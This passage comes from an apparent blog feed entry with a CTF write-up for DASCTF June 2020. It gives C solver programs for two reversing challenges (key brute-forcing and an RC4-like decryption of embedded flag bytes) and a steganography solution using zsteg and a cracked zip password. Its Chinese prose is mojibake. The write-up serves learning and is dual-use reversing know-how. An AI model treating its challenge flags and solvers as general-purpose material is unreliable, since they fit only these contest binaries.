class="number">58</span>, <span class="number">44</span>, <span class="number">8</span>, <span class="number">49</span>, <span class="number">11</span>, <span class="number">55</span>, <span class="number">12</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">32</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((i&amp;<span class="number">0xf</span>) == v11[<span class="number">14</span>])</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((j&amp;<span class="number">0xf</span>) == v11[<span class="number">31</span><span class="number">-14</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((i^j) == v59[<span class="number">14</span>]) &amp;&amp; ((i&amp;j) == v43[<span class="number">14</span>]))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c%c "</span>, i, j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626211709542.png" alt="image-20200626211709542"></p></li><li><p>å› ä¸ºæ˜¯æˆå¯¹çš„ï¼Œå°†ä¹‹å‰çš„å¾—åˆ°çš„ä¸å”¯ä¸€çš„keyï¼ŒæŒ‡å®šä½ç½®æ¢æˆè¿™3å¯¹å­—ç¬¦ã€‚ç„¶åè½½å…¥ODï¼Œä¾æ¬¡è¯•ä¸€ä¸‹ï¼Œå‘ç°å½“Oxä¸oXéƒ½ä¼šæŠ¥é”™ï¼Œè€Œ_hæ­£å¸¸æ‰§è¡Œã€‚å¾—åˆ°æ­¤æ—¶çš„ç¨‹åºçŠ¶æ€ådumpå‡ºæ¥ã€‚</p></li><li><p>å°†dumpå‡ºçš„æ–‡ä»¶ï¼Œè½½å…¥idaçœ‹ä¸€ä¸‹é‡å†™çš„å‡½æ•°çš„åŠŸèƒ½ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626212512352.png" alt="image-20200626212512352"></p></li><li><p>å› ä¸ºæ²¡çœ‹é¢˜ç›®æç¤ºï¼Œä½¿ç”¨ä¹‹å‰æ‰¾key[14]çš„åŠæ³•ï¼Œæ‰€æœ‰æƒ…å†µè§£å‡ºåçœ‹keyæ€ä¹ˆé¡ºçœ¼ã€‚æœ€åå¾—åˆ°ï¼š<strong>Nep{mircle_and_maho_is_not_free}</strong></p></li><li><p>å…¶å®é¢˜ç›®ç»™äº†æ ¼å¼çš„æç¤ºã€‚ã€‚ã€‚</p></li><li><p>å†è®°å½•ä¸‹idaä¸­v35[i] = â€¦â€¦è¯­å¥çš„åœ°å€ï¼Œè¿›å…¥ODä¸­ä¸‹æ–­ç‚¹ï¼Œç„¶åè¾“å…¥æ­£ç¡®çš„keyï¼Œå¾—åˆ°æœ€ç»ˆflag:</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626212858460.png" alt="image-20200626212858460"></p></li></ul><h3 id="521"><a href="#521" class="headerlink" title="521"></a>521</h3><ul><li><p>64ä½elfæ–‡ä»¶ï¼Œè¿è¡Œçœ‹ä¸€ä¸‹ï¼Œç›´æ¥è®©è¾“å…¥flagç„¶åéªŒè¯ã€‚</p></li><li><p>è¿˜æ˜¯è½½å…¥idaï¼š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626213538336.png" alt="image-20200626213538336"></p></li><li><p>è¿›å…¥v4 = sub_55FE07F79864(a4, (__int64)&amp;v8)ï¼š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626213804986.png" alt="image-20200626213804986"></p></li><li><p>æ¥ç€çœ‹ä¸‹é¢ï¼š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626214036174.png" alt="image-20200626214036174"></p></li><li><p>ä¸Šé¢æ ‡é»„çš„æ˜¯æ•´ä¸ªé¢˜çš„å…³é”®å‡½æ•°ï¼Œè¿›å…¥ï¼š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626214524044.png" alt="image-20200626214524044"></p></li><li><p>idaåŠ¨è°ƒæå–å‡ºæ•°æ®è¡¨ï¼š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/102BQ%60SD09NF5_648M8$WH.png" alt="img"></p></li><li><p>æœ€åexpï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">128</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">89</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">53</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">34</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">115</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">141</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">26</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">81</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">93</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">48</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">232</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">87</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">38</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">246</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">    <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">198</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">146</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">94</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">220</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">131</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">31</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">118</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">146</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>,  <span class="number">37</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">101</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">251</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">46</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">107</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">135</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">233</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">159</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">34</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">256</span>] = &#123;</span><br><span class="line">  <span class="number">0x1A</span>, <span class="number">0x32</span>, <span class="number">0x4A</span>, <span class="number">0x3B</span>, <span class="number">0x30</span>, <span class="number">0xA5</span>, <span class="number">0x7F</span>, <span class="number">0xF0</span>, <span class="number">0xC4</span>, <span class="number">0x48</span>, </span><br><span class="line">  <span class="number">0xE5</span>, <span class="number">0x52</span>, <span class="number">0xC7</span>, <span class="number">0x53</span>, <span class="number">0xC0</span>, <span class="number">0x2D</span>, <span class="number">0xBE</span>, <span class="number">0xEC</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, </span><br><span class="line">  <span class="number">0xB1</span>, <span class="number">0x04</span>, <span class="number">0x18</span>, <span class="number">0x2E</span>, <span class="number">0xB5</span>, <span class="number">0x44</span>, <span class="number">0x15</span>, <span class="number">0x57</span>, <span class="number">0xDC</span>, <span class="number">0x9F</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x42</span>, <span class="number">0xFF</span>, <span class="number">0x22</span>, <span class="number">0x4D</span>, <span class="number">0xA6</span>, <span class="number">0x33</span>, <span class="number">0x5F</span>, <span class="number">0x5C</span>, <span class="number">0x8E</span>, </span><br><span class="line">  <span class="number">0x3F</span>, <span class="number">0x4C</span>, <span class="number">0xA8</span>, <span class="number">0xFE</span>, <span class="number">0x1C</span>, <span class="number">0x7E</span>, <span class="number">0x24</span>, <span class="number">0x6C</span>, <span class="number">0x6A</span>, <span class="number">0x9C</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0xA1</span>, <span class="number">0x50</span>, <span class="number">0xC5</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0xC1</span>, <span class="number">0x26</span>, <span class="number">0x16</span>, <span class="number">0x55</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0xCD</span>, <span class="number">0xAA</span>, <span class="number">0x8A</span>, <span class="number">0xD1</span>, <span class="number">0x74</span>, <span class="number">0x77</span>, <span class="number">0xD8</span>, <span class="number">0x68</span>, <span class="number">0xFC</span>, </span><br><span class="line">  <span class="number">0x19</span>, <span class="number">0xCC</span>, <span class="number">0xE7</span>, <span class="number">0x88</span>, <span class="number">0xB7</span>, <span class="number">0xE6</span>, <span class="number">0x3E</span>, <span class="number">0x70</span>, <span class="number">0x86</span>, <span class="number">0x9E</span>, </span><br><span class="line">  <span class="number">0x98</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x56</span>, <span class="number">0xCA</span>, <span class="number">0x95</span>, <span class="number">0xB2</span>, <span class="number">0x51</span>, <span class="number">0xAF</span>, <span class="number">0xD3</span>, </span><br><span class="line">  <span class="number">0x6B</span>, <span class="number">0x28</span>, <span class="number">0x8B</span>, <span class="number">0xEE</span>, <span class="number">0xBC</span>, <span class="number">0x9B</span>, <span class="number">0x85</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x84</span>, <span class="number">0xBF</span>, <span class="number">0x25</span>, <span class="number">0x59</span>, <span class="number">0xBA</span>, <span class="number">0x46</span>, <span class="number">0xB8</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x3D</span>, <span class="number">0xB0</span>, <span class="number">0x7A</span>, <span class="number">0xEB</span>, <span class="number">0x38</span>, <span class="number">0x5A</span>, <span class="number">0x41</span>, <span class="number">0x8D</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x81</span>, <span class="number">0x79</span>, <span class="number">0x12</span>, <span class="number">0x40</span>, <span class="number">0x1B</span>, <span class="number">0xF8</span>, <span class="number">0xED</span>, <span class="number">0x82</span>, <span class="number">0x8F</span>, </span><br><span class="line">  <span class="number">0xD4</span>, <span class="number">0x94</span>, <span class="number">0xC8</span>, <span class="number">0x0E</span>, <span class="number">0xE3</span>, <span class="number">0x10</span>, <span class="number">0xB4</span>, <span class="number">0x39</span>, <span class="number">0x3C</span>, <span class="number">0x54</span>, </span><br><span class="line">  <span class="number">0x5B</span>, <span class="number">0x4F</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0x08</span>, <span class="number">0xBD</span>, <span class="number">0xF4</span>, <span class="number">0x5D</span>, <span class="number">0x91</span>, <span class="number">0x1F</span>, </span><br><span class="line">  <span class="number">0x7C</span>, <span class="number">0x8C</span>, <span class="number">0x66</span>, <span class="number">0xCE</span>, <span class="number">0x7B</span>, <span class="number">0x99</span>, <span class="number">0xC3</span>, <span class="number">0xD6</span>, <span class="number">0x29</span>, <span class="number">0xA2</span>, </span><br><span class="line">  <span class="number">0xAB</span>, <span class="number">0xC9</span>, <span class="number">0x4E</span>, <span class="number">0xCF</span>, <span class="number">0xDB</span>, <span class="number">0xF6</span>, <span class="number">0xA3</span>, <span class="number">0x03</span>, <span class="number">0xB9</span>, <span class="number">0xA7</span>, </span><br><span class="line">  <span class="number">0xEA</span>, <span class="number">0x69</span>, <span class="number">0x05</span>, <span class="number">0x1D</span>, <span class="number">0xEF</span>, <span class="number">0x0B</span>, <span class="number">0x23</span>, <span class="number">0x11</span>, <span class="number">0x37</span>, <span class="number">0x21</span>, </span><br><span class="line">  <span class="number">0x1E</span>, <span class="number">0xBB</span>, <span class="number">0x17</span>, <span class="number">0xD2</span>, <span class="number">0xB3</span>, <span class="number">0xDE</span>, <span class="number">0x2C</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x61</span>, <span class="number">0xCB</span>, <span class="number">0xAD</span>, <span class="number">0x9A</span>, <span class="number">0xA4</span>, <span class="number">0xF3</span>, <span class="number">0x0A</span>, <span class="number">0xA0</span>, <span class="number">0x14</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0x92</span>, <span class="number">0x0D</span>, <span class="number">0x5E</span>, <span class="number">0xA9</span>, <span class="number">0xD5</span>, <span class="number">0x90</span>, <span class="number">0x96</span>, <span class="number">0x6F</span>, <span class="number">0x36</span>, </span><br><span class="line">  <span class="number">0xFD</span>, <span class="number">0x76</span>, <span class="number">0x45</span>, <span class="number">0xDA</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0x0F</span>, <span class="number">0xB6</span>, <span class="number">0x34</span>, <span class="number">0x3A</span>, </span><br><span class="line">  <span class="number">0xDD</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xAC</span>, <span class="number">0xFB</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x27</span>, <span class="number">0x13</span>, <span class="number">0x93</span>, </span><br><span class="line">  <span class="number">0x87</span>, <span class="number">0x72</span>, <span class="number">0x89</span>, <span class="number">0x49</span>, <span class="number">0x73</span>, <span class="number">0x71</span>, <span class="number">0x7D</span>, <span class="number">0x06</span>, <span class="number">0x9D</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x83</span>, <span class="number">0xE8</span>, <span class="number">0xC2</span>, <span class="number">0x75</span>, <span class="number">0xAE</span>, <span class="number">0xF7</span>, <span class="number">0x97</span>, <span class="number">0x60</span>, <span class="number">0xE1</span>, <span class="number">0xD9</span>, </span><br><span class="line">  <span class="number">0x2F</span>, <span class="number">0x6E</span>, <span class="number">0x4B</span>, <span class="number">0x31</span>, <span class="number">0xE9</span>, <span class="number">0x43</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v6 = <span class="number">0</span>, v7 = <span class="number">0</span>, v5 = <span class="number">0</span>, ans[<span class="number">37</span>] = &#123;<span class="number">0</span>&#125;, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">37</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">296</span>; i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">ans[j++] = *(<span class="keyword">long</span> <span class="keyword">int</span> *)(&amp;ida_chars[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v6 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)(v6 + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) + v6 + <span class="number">1</span>) - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)(v6 + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">v5 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v7 + a[v6]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">v7 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(v5 + v7 + a[v6]) - v5;</span><br><span class="line"><span class="keyword">int</span> temp = a[v6];</span><br><span class="line">a[v6] = a[v7];</span><br><span class="line">a[v7] = temp;</span><br><span class="line"></span><br><span class="line">flag[i] = ans[i]^a[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)(a[v6] + a[v7])];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626214751017.png" alt="image-20200626214751017"></p></li></ul><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="é€æ˜åº¦"><a href="#é€æ˜åº¦" class="headerlink" title="é€æ˜åº¦"></a>é€æ˜åº¦</h3><p>é¢˜ç›®æè¿°ï¼šä½ çŸ¥é“RGBAå—ï¼Ÿ</p><p>ä¸‹è½½åæ˜¯ä¸€å¼ è¡¨æƒ…åŒ…ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/Rgba.png" alt="Rgba"></p><p>ä»é¢˜ç›®çš„æè¿°ä¸RGBæœ‰å…³ï¼Œæ”¾å…¥Stegsolveä¸­çœ‹ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°åœ¨é€æ˜çš„ç®¡é“éšè—æœ‰æ•°æ®ã€‚ä¸”é¢˜ç›®åç§°éƒ½æ˜¯é€æ˜åº¦ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627094515063.png" alt="image-20200627094515063"></p><p>ç„¶åç›´æ¥æå–å‡ºé€æ˜ç®¡é“çš„æ‰€æœ‰æ•°æ®ï¼Œä½†å¼€å§‹è‡ªå·±å¤åˆ¶çš„æ•°æ®ç„¶åç²˜è´´åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œæœ€åå¾—åˆ°çš„å‹ç¼©åŒ…ä¸€ç›´æŸåã€‚åé¢å¯¹æ¯”å‘ç°æ˜¯æ¯æ¬¡æ¢è¡Œçš„åœ°æ–¹ä¼šå‡ºé—®é¢˜ã€‚</p><p>å…¶å®ç›´æ¥save bin å•Š</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627094815397.png" alt="image-20200627094815397"></p><p>æœ€åå¾—åˆ°çš„è¦å‹ç¼©åŒ…æ ¹æ®æç¤ºçˆ†ç ´å‡ºå¯†ç å³å¯ï¼šnepnb</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627095017830.png" alt="image-20200627095017830"></p><p>æœ€åå…¶å®è¿™ä¸ªçš„é¢˜ä½¿ç”¨zestegå¯ä»¥ç›´æ¥å¾—åˆ°å‹ç¼©åŒ…ã€‚</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200627095200352.png" alt="image-20200627095200352"></p><p>å†ä½¿ç”¨<strong>zsteg Rgba.png -e â€˜b8,a,lsb,xyâ€™ &gt; 1.zip</strong>æå–å‡ºå‹ç¼©åŒ…ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnç»ƒä¹ </title>
      <link href="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/"/>
      <url>/2020/06/04/pwn%E7%BB%83%E4%B9%A0/</url>
      
